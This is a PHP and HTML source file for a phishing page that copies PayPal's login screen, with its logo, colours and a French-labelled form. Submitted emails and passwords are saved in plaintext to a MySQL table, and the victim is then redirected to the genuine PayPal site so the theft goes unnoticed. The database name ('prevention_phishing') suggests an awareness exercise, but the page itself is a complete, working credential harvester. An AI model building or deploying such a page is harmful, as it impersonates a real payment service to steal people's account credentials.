<?php // envoie log phpmyadmin et ne redirige pas le user
$bdd = new PDO('mysql:host=localhost;dbname=prevention_phishing;charset=utf8;', 'root', 'root');
if (isset($_POST['envoie'])) {
    if (!empty($_POST['pseudo']) && !empty($_POST['mdp'])) {
        $pseudo = htmlspecialchars($_POST['pseudo']);
        $mdp = htmlspecialchars($_POST['mdp']);
        //$mdp = sha1($_POST['mdp']);
        $insertUser = $bdd->prepare('INSERT INTO users(pseudo, mdp) VALUES(?,?)');
        $insertUser->execute(array($pseudo, $mdp));
    } 
    header('Location: https://www.paypal.com/fr/home');

}
?>

<div id="main" class="main " role="main">
    <section id="login" class="login" data-role="page" data-title="Log in to your paypal account">
        <div class="corral">
            <div id="content" class="contentContainer">
                <style>
                    .corral {
                        margin: 0 auto;
                        width: 460px;
                    }
                    
                    .contentContainer {
                        position: relative;
                        margin: 130px auto 0;
                        padding: 30px 10% 50px;
                        -webkit-border-radius: 5px;
                        -moz-border-radius: 5px;
                        -khtml-border-radius: 5px;
                        border-radius: 5px;
                    }
                    
                    .textInput input,
                    .textInput textarea {
                        height: 44px;
                        width: 100%;
                        padding: 0 10px;
                        border: 1px solid #9da3a6;
                        background: #fff;
                        text-overflow: ellipsis;
                        -webkit-box-sizing: border-box;
                        -moz-box-sizing: border-box;
                        box-sizing: border-box;
                        -webkit-border-radius: 4px;
                        -moz-border-radius: 4px;
                        -khtml-border-radius: 4px;
                        border-radius: 4px;
                        -webkit-box-shadow: none;
                        -moz-box-shadow: none;
                        box-shadow: none;
                        color: #000;
                        font-size: 1em;
                        font-family: Helvetica, Arial, sans-serif;
                        font-weight: 400;
                        direction: ltr;
                    }
                    
                    .textInput {
                        position: relative;
                        margin: 0 0 10px;
                    }
                    
                    .textInput .form-label {
                        position: absolute;
                        color: #6c7378;
                        clip: rect(1px 1px 1px 1px);
                        clip: rect(1px, 1px, 1px, 1px);
                        padding: 0;
                        border: 0;
                        height: 1px;
                        width: 1px;
                        overflow: hidden;
                    }
                    
                    a.button:hover,
                    a.button:link:hover,
                    a.button:visited:hover,
                    .button:hover {
                        background-color: #005ea6;
                        outline: 0;
                    }
                    
                    a.button,
                    a.button:link,
                    a.button:visited,
                    .button {
                        width: 100%;
                        height: 44px;
                        padding: 0;
                        border: 0;
                        display: block;
                        background-color: #0070ba;
                        -webkit-box-shadow: none;
                        -moz-box-shadow: none;
                        box-shadow: none;
                        -webkit-border-radius: 4px;
                        -moz-border-radius: 4px;
                        -khtml-border-radius: 4px;
                        border-radius: 4px;
                        -webkit-box-sizing: border-box;
                        -moz-box-sizing: border-box;
                        box-sizing: border-box;
                        cursor: pointer;
                        -webkit-appearance: none;
                        -moz-appearance: none;
                        -ms-appearance: none;
                        -o-appearance: none;
                        appearance: none;
                        -webkit-tap-highlight-color: transparent;
                        color: #fff;
                        font-size: 1em;
                        text-align: center;
                        font-weight: 700;
                        font-family: HelveticaNeue-Medium, "Helvetica Neue Medium", HelveticaNeue, "Helvetica Neue", Helvetica, Arial, sans-serif;
                        text-shadow: none;
                        text-decoration: none;
                        -webkit-transition: background-color .4s ease-out;
                        -moz-transition: background-color .4s ease-out;
                        -o-transition: background-color .4s ease-out;
                        transition: background-color .4s ease-out;
                        -webkit-font-smoothing: antialiased;
                    }
                    
                    .actionsSpaced {
                        margin-top: 30px;
                    }
                    
                    .fieldWrapper {
                        position: relative;
                        z-index: 2;
                        width: 100%;
                    }
                    
                    .forgotLink {
                        margin: 20px auto;
                        padding-bottom: 20px;
                        border-bottom: 1px solid #cbd2d6;
                        text-align: center;
                    }
                    
                    a.button.secondary,
                    a.button.secondary:link,
                    a.button.secondary:visited,
                    .button.secondary {
                        background-color: #E1E7EB;
                        color: #2C2E2F;
                    }
                    
                    a.button,
                    a.button:link,
                    a.button:visited {
                        padding-top: 11px;
                    }
                    
                    a,
                    a:link,
                    a:visited {
                        color: #0070ba;
                        font-family: HelveticaNeue, "Helvetica Neue", Helvetica, Arial, sans-serif;
                        font-weight: 400;
                        text-decoration: none;
                        -webkit-transition: color .2s ease-out;
                        -moz-transition: color .2s ease-out;
                        -o-transition: color .2s ease-out;
                        transition: color .2s ease-out;
                    }
                </style>
                <header>
                    <p class="paypal-logo paypal-logo-long">
                        <center><img style="align:center; width:50px;height:50px;" src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg"></center>
                    </p>
                </header>
                
                <form id="monFormulaire" action="" method="POST" enctype="multipart/form-data" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                    <div id="passwordSection" class="clearfix">
                        <div class="textInput" id="pseudodiv">
                            <div class="fieldWrapper">
                                <label for="text" class="form-label">email</label>
                                <input id="text" name="pseudo" type="text" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="email">
                            </div>
                        </div>
                        <div class="textInput lastInputField" id="mdpdiv">
                            <div class="fieldWrapper"><label for="password" class="form-label">Password</label>
                                <input id="password" name="mdp" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password">
                            </div>
                        </div>
                    </div>
                    <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="envoie" name="envoie" value="Login">Connexion</button></div>
                    <div class="forgotLink"><a href="prevention.php" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Adresse email oubliée ?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
                </form>

                <a href="#" class="button secondary" id="createAccount">Ouvrir un compte</a></div>
        </div>
    </section>
</div>
